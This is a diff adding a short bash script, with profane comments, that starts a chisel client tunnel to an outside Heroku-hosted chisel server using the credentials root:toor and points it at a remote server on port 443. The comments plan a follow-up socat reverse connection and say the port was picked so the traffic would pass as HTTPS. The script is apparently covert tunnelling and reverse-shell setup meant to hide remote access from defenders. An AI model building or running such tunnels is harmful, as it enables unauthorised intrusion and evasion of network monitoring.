@@ -1,0 +1,16 @@
+#!/bin/bash
+# Well fucking shit. this is socat-tunnel number two cuz my dumbass ftp'd w/ ncat and 
+# screwed the pooch.
+#
+# Aight lets take another go at this. We're setting up the chisel client to point to the heroku
+# chisel server. (https://chisel-serv.herokuapp.com) Then this fucking thing better work.
+sudo chisel client --auth root:toor https://chisel-serv.herokuapp.com <your-remote-server>:443 
+# We gonna point this shit towards my main VPS on port 43 cuz I feel like 4443 (which i was gonna
+# use originally so that dumbasses would think it was https) would be too high of a port number
+#
+#
+# nvm this isan update to use port 443
+#
+#
+# Then we're gonna use the socat reverse shit pointed towards localhost:443
+# and pray to god this shit works
